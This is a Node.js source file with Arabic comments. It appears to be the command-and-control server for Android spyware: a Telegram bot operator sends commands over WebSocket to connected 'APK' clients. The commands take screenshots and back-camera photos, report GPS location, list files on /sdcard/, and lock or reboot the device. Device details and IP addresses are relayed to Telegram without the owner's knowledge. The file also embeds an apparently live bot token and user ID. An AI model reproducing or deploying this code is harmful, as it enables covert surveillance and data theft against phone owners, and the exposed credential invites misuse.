const express = require('express');
const WebSocket = require('ws');
const TelegramBot = require('node-telegram-bot-api');
const http = require('http');

// 🔧 الإعدادات - ضع بياناتك هنا
const config = {
    TELEGRAM_TOKEN: "8330048649:AAFYzP0EvuJTYm__yo4AROYvIt3fy-HDGXY", // ضع توكن البوت هنا
    AUTHORIZED_USERS: [7604667042], // ضع أيدي التلجرام الخاص بك هنا
    SERVER_PORT: process.env.PORT || 3000,
    SERVER_HOST: "0.0.0.0"
};

// التحقق من البيانات
if (config.TELEGRAM_TOKEN === "1234567890:ABCdefGHIjklMNopQRstUVwxYZ123456789") {
    console.log("❌ يرجى تغيير التوكن في السطر 9");
    process.exit(1);
}

if (config.AUTHORIZED_USERS[0] === 123456789) {
    console.log("❌ يرجى تغيير أيدي التلجرام في السطر 10");
    process.exit(1);
}

const app = express();
const server = http.createServer(app);

// 🔧 إصلاح: إنشاء WebSocket server بشكل صحيح
const wss = new WebSocket.Server({ 
    server,
    perMessageDeflate: false
});

const bot = new TelegramBot(config.TELEGRAM_TOKEN, {
    polling: {
        interval: 300,
        autoStart: true,
        params: {
            timeout: 10
        }
    }
});

const connectedDevices = new Map();
const userSessions = new Map();

app.use(express.json());

// 🔧 صفحة رئيسية للتأكد من عمل السيرفر
app.get('/', (req, res) => {
    res.json({
        status: '✅ السيرفر يعمل',
        devices: connectedDevices.size,
        uptime: process.uptime(),
        webSocket: '✅ نشط'
    });
});

// 🔧 صفحة لفحص WebSocket
app.get('/websocket', (req, res) => {
    res.send(`
        <html>
            <body>
                <h1>فحص WebSocket</h1>
                <div id="status">جاري الاختبار...</div>
                <script>
                    const ws = new WebSocket('wss://' + window.location.host);
                    ws.onopen = () => document.getElementById('status').innerHTML = '✅ WebSocket يعمل';
                    ws.onerror = () => document.getElementById('status').innerHTML = '❌ WebSocket لا يعمل';
                </script>
            </body>
        </html>
    `);
});

// 🔌 اتصال WebSocket من APK
wss.on('connection', (ws, req) => {
    const deviceId = generateDeviceId();
    const clientIp = req.socket.remoteAddress;
    
    console.log(`📱 APK متصل: ${deviceId} من ${clientIp}`);
    
    connectedDevices.set(deviceId, {
        ws: ws,
        ip: clientIp,
        connectedAt: new Date(),
        info: {}
    });

    // 🔧 إصلاح: إرسال رسالة ترحيب فور الاتصال
    setTimeout(() => {
        if (ws.readyState === ws.OPEN) {
            ws.send(JSON.stringify({
                type: 'welcome',
                deviceId: deviceId,
                message: 'تم الاتصال بنجاح بالسيرفر',
                timestamp: Date.now(),
                status: 'connected'
            }));
        }
    }, 1000);

    // 📨 إرسال إشعار للتلجرام
    sendToTelegram(`📱 جهاز جديد متصل\n🎯 المعرف: ${deviceId}\n🌐 IP: ${clientIp}`);

    // 📩 استقبال البيانات من APK
    ws.on('message', (data) => {
        try {
            const message = JSON.parse(data);
            console.log(`📩 رسالة من ${deviceId}:`, message.type);
            handleAPKMessage(deviceId, message);
        } catch (error) {
            console.error('❌ خطأ في معالجة رسالة APK:', error, data.toString());
        }
    });

    ws.on('close', () => {
        console.log(`❌ APK انقطع: ${deviceId}`);
        connectedDevices.delete(deviceId);
        sendToTelegram(`❌ جهاز انقطع: ${deviceId}`);
    });

    ws.on('error', (error) => {
        console.error(`❌ خطأ WebSocket لـ ${deviceId}:`, error);
    });
});

// ⚡ معالجة رسائل APK
function handleAPKMessage(deviceId, message) {
    const device = connectedDevices.get(deviceId);
    if (!device) return;

    switch (message.type) {
        case 'device_info':
            device.info = message.data;
            sendToTelegram(
                `📊 معلومات الجهاز ${deviceId}\n` +
                `📱 الموديل: ${message.data.model || 'غير معروف'}\n` +
                `🤖 أندرويد: ${message.data.androidVersion || 'غير معروف'}\n` +
                `🔋 البطارية: ${message.data.battery || 'غير معروف'}%`
            );
            break;

        case 'location':
            sendToTelegram(
                `📍 موقع الجهاز ${deviceId}\n` +
                `📌 خط الطول: ${message.data.longitude}\n` +
                `📌 خط العرض: ${message.data.latitude}`
            );
            break;

        case 'screenshot_result':
            sendToTelegram(message.success ? 
                `✅ تم التقاط لقطة شاشة من ${deviceId}` : 
                `❌ فشل في لقطة الشاشة من ${deviceId}`
            );
            break;

        case 'camera_result':
            if (message.success) {
                sendToTelegram(`✅ تم التقاط صورة من الكاميرا ${deviceId}`);
            }
            break;

        case 'file_list':
            const files = message.data?.files || [];
            sendToTelegram(
                `📁 ملفات ${deviceId}\n` +
                files.slice(0, 5).map(f => `📄 ${f}`).join('\n') +
                (files.length > 5 ? `\n... و ${files.length - 5} ملفات أخرى` : '')
            );
            break;

        case 'ping':
            // 🔧 رد على ping من APK
            sendToDevice(deviceId, { type: 'pong', timestamp: Date.now() });
            break;

        default:
            console.log('📨 رسالة غير معروفة:', message);
    }
}

// 🤖 أوامر التلجرام
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    
    if (!config.AUTHORIZED_USERS.includes(chatId)) {
        return bot.sendMessage(chatId, '❌ غير مصرح لك بالوصول');
    }

    const keyboard = {
        reply_markup: {
            keyboard: [
                ['📊 حالة السيرفر', '📋 الأجهزة المتصلة'],
                ['🖼️ لقطة شاشة', '📍 الموقع'],
                ['📁 الملفات', '📷 الكاميرا'],
                ['🔒 قفل الجهاز', '🔄 إعادة تشغيل']
            ],
            resize_keyboard: true
        }
    };

    bot.sendMessage(chatId, 
        `🎮 **مرحباً بك في نظام التحكم عن بعد**\n\n` +
        `استخدم الأزرار أدناه للتحكم بالأجهزة المتصلة.`,
        { parse_mode: 'Markdown', ...keyboard }
    );
});

// 📋 قائمة الأجهزة
bot.onText(/📋 الأجهزة المتصلة/, (msg) => {
    const chatId = msg.chat.id;
    if (!config.AUTHORIZED_USERS.includes(chatId)) return;

    if (connectedDevices.size === 0) {
        return bot.sendMessage(chatId, '❌ لا توجد أجهزة متصلة');
    }

    const devicesKeyboard = {
        reply_markup: {
            keyboard: [
                ...Array.from(connectedDevices.keys()).map(deviceId => [deviceId]),
                ['↩️ رجوع']
            ],
            resize_keyboard: true
        }
    };

    let devicesList = '📱 **الأجهزة المتصلة:**\n\n';
    connectedDevices.forEach((device, deviceId) => {
        devicesList += `🔹 ${deviceId}\n📍 ${device.ip}\n\n`;
    });

    userSessions.set(chatId, { step: 'select_device' });

    bot.sendMessage(chatId, devicesList + 'اختر جهاز من القائمة:', { 
        parse_mode: 'Markdown',
        ...devicesKeyboard 
    });
});

// 📊 حالة السيرفر
bot.onText(/📊 حالة السيرفر/, (msg) => {
    const chatId = msg.chat.id;
    if (!config.AUTHORIZED_USERS.includes(chatId)) return;

    bot.sendMessage(chatId,
        `📊 **حالة السيرفر**\n` +
        `🖥️ السيرفر: ✅ نشط\n` +
        `📱 الأجهزة: ${connectedDevices.size} متصل\n` +
        `⏰ التشغيل: ${formatUptime(process.uptime())}`,
        { parse_mode: 'Markdown' }
    );
});

// معالجة اختيار الجهاز
bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    if (!config.AUTHORIZED_USERS.includes(chatId)) return;

    const text = msg.text;
    const session = userSessions.get(chatId) || {};

    // إذا كان المستخدم يختار جهاز
    if (session.step === 'select_device' && connectedDevices.has(text)) {
        userSessions.set(chatId, { 
            step: 'device_selected', 
            selectedDevice: text 
        });

        const controlKeyboard = {
            reply_markup: {
                keyboard: [
                    ['🖼️ لقطة شاشة', '📍 الموقع'],
                    ['📁 الملفات', '📷 الكاميرا'],
                    ['🔒 قفل الجهاز', '🔄 إعادة تشغيل'],
                    ['↩️ رجوع للأجهزة']
                ],
                resize_keyboard: true
            }
        };

        bot.sendMessage(chatId, 
            `🎯 **الجهاز المحدد:** ${text}\n\n` +
            `اختر الأمر الذي تريد تنفيذه:`,
            { parse_mode: 'Markdown', ...controlKeyboard }
        );
    }

    // الرجوع للقائمة الرئيسية
    if (text === '↩️ رجوع') {
        userSessions.set(chatId, {});
        const mainKeyboard = {
            reply_markup: {
                keyboard: [
                    ['📊 حالة السيرفر', '📋 الأجهزة المتصلة'],
                    ['🖼️ لقطة شاشة', '📍 الموقع'],
                    ['📁 الملفات', '📷 الكاميرا'],
                    ['🔒 قفل الجهاز', '🔄 إعادة تشغيل']
                ],
                resize_keyboard: true
            }
        };
        bot.sendMessage(chatId, '🏠 الرئيسية', mainKeyboard);
    }

    // الرجوع لقائمة الأجهزة
    if (text === '↩️ رجوع للأجهزة') {
        userSessions.set(chatId, { step: 'select_device' });
        
        const devicesKeyboard = {
            reply_markup: {
                keyboard: [
                    ...Array.from(connectedDevices.keys()).map(deviceId => [deviceId]),
                    ['↩️ رجوع']
                ],
                resize_keyboard: true
            }
        };

        bot.sendMessage(chatId, '📱 اختر جهاز:', devicesKeyboard);
    }
});

// 🖼️ لقطة شاشة
bot.onText(/🖼️ لقطة شاشة/, (msg) => {
    const chatId = msg.chat.id;
    if (!config.AUTHORIZED_USERS.includes(chatId)) return;

    const session = userSessions.get(chatId);
    if (!session || !session.selectedDevice) {
        return bot.sendMessage(chatId, '❌ يرجى اختيار جهاز أولاً');
    }

    const success = sendToDevice(session.selectedDevice, {
        type: 'take_screenshot',
        quality: 80
    });

    bot.sendMessage(chatId, 
        success ? 
        `📸 جاري أخذ لقطة شاشة من ${session.selectedDevice}...` :
        `❌ فشل إرسال الأمر للجهاز ${session.selectedDevice}`
    );
});

// 📍 الموقع
bot.onText(/📍 الموقع/, (msg) => {
    const chatId = msg.chat.id;
    if (!config.AUTHORIZED_USERS.includes(chatId)) return;

    const session = userSessions.get(chatId);
    if (!session || !session.selectedDevice) {
        return bot.sendMessage(chatId, '❌ يرجى اختيار جهاز أولاً');
    }

    const success = sendToDevice(session.selectedDevice, {
        type: 'get_location'
    });

    bot.sendMessage(chatId, 
        success ? 
        `📍 جاري الحصول على موقع ${session.selectedDevice}...` :
        `❌ فشل إرسال الأمر للجهاز ${session.selectedDevice}`
    );
});

// 📁 الملفات
bot.onText(/📁 الملفات/, (msg) => {
    const chatId = msg.chat.id;
    if (!config.AUTHORIZED_USERS.includes(chatId)) return;

    const session = userSessions.get(chatId);
    if (!session || !session.selectedDevice) {
        return bot.sendMessage(chatId, '❌ يرجى اختيار جهاز أولاً');
    }

    const success = sendToDevice(session.selectedDevice, {
        type: 'list_files',
        path: '/sdcard/'
    });

    bot.sendMessage(chatId, 
        success ? 
        `📁 جاري استعراض ملفات ${session.selectedDevice}...` :
        `❌ فشل إرسال الأمر للجهاز ${session.selectedDevice}`
    );
});

// 📷 الكاميرا
bot.onText(/📷 الكاميرا/, (msg) => {
    const chatId = msg.chat.id;
    if (!config.AUTHORIZED_USERS.includes(chatId)) return;

    const session = userSessions.get(chatId);
    if (!session || !session.selectedDevice) {
        return bot.sendMessage(chatId, '❌ يرجى اختيار جهاز أولاً');
    }

    const success = sendToDevice(session.selectedDevice, {
        type: 'take_camera_photo',
        camera: 'back'
    });

    bot.sendMessage(chatId, 
        success ? 
        `📷 جاري التقاط صورة من ${session.selectedDevice}...` :
        `❌ فشل إرسال الأمر للجهاز ${session.selectedDevice}`
    );
});

// 🔒 قفل الجهاز
bot.onText(/🔒 قفل الجهاز/, (msg) => {
    const chatId = msg.chat.id;
    if (!config.AUTHORIZED_USERS.includes(chatId)) return;

    const session = userSessions.get(chatId);
    if (!session || !session.selectedDevice) {
        return bot.sendMessage(chatId, '❌ يرجى اختيار جهاز أولاً');
    }

    const success = sendToDevice(session.selectedDevice, {
        type: 'lock_device'
    });

    bot.sendMessage(chatId, 
        success ? 
        `🔒 جاري قفل الجهاز ${session.selectedDevice}...` :
        `❌ فشل إرسال الأمر للجهاز ${session.selectedDevice}`
    );
});

// 🔄 إعادة تشغيل
bot.onText(/🔄 إعادة تشغيل/, (msg) => {
    const chatId = msg.chat.id;
    if (!config.AUTHORIZED_USERS.includes(chatId)) return;

    const session = userSessions.get(chatId);
    if (!session || !session.selectedDevice) {
        return bot.sendMessage(chatId, '❌ يرجى اختيار جهاز أولاً');
    }

    const success = sendToDevice(session.selectedDevice, {
        type: 'reboot_device'
    });

    bot.sendMessage(chatId, 
        success ? 
        `🔄 جاري إعادة تشغيل الجهاز ${session.selectedDevice}...` :
        `❌ فشل إرسال الأمر للجهاز ${session.selectedDevice}`
    );
});

// ⚡ إرسال أمر لجهاز
function sendToDevice(deviceId, command) {
    const device = connectedDevices.get(deviceId);
    if (!device || !device.ws || device.ws.readyState !== WebSocket.OPEN) {
        console.log(`❌ الجهاز ${deviceId} غير متصل`);
        return false;
    }

    try {
        device.ws.send(JSON.stringify(command));
        console.log(`✅ تم إرسال أمر ${command.type} لـ ${deviceId}`);
        return true;
    } catch (error) {
        console.error(`❌ فشل إرسال أمر لـ ${deviceId}:`, error);
        return false;
    }
}

// 📨 إرسال رسالة للتلجرام
function sendToTelegram(message) {
    config.AUTHORIZED_USERS.forEach(userId => {
        bot.sendMessage(userId, message).catch(err => {
            console.error('❌ فشل إرسال للتلجرام:', err);
        });
    });
}

// 🛠️ وظائف مساعدة
function generateDeviceId() {
    return 'device_' + Math.random().toString(36).substring(2, 8);
}

function formatUptime(seconds) {
    const hours = Math.floor(seconds / 3600);
    const minutes = Math.floor((seconds % 3600) / 60);
    return `${hours} ساعة, ${minutes} دقيقة`;
}

// 🚀 بدء السيرفر
server.listen(config.SERVER_PORT, config.SERVER_HOST, () => {
    console.log(`✅ السيرفر يعمل على: http://${config.SERVER_HOST}:${config.SERVER_PORT}`);
    console.log(`🤖 بوت التلجرام جاهز`);
    console.log(`📱 جاهز لاستقبال اتصالات APK`);
    console.log(`🔗 رابط WebSocket: wss://bot-d4k2.onrender.com`);
});

process.on('uncaughtException', (error) => {
    console.error('❌ خطأ غير متوقع:', error);
});
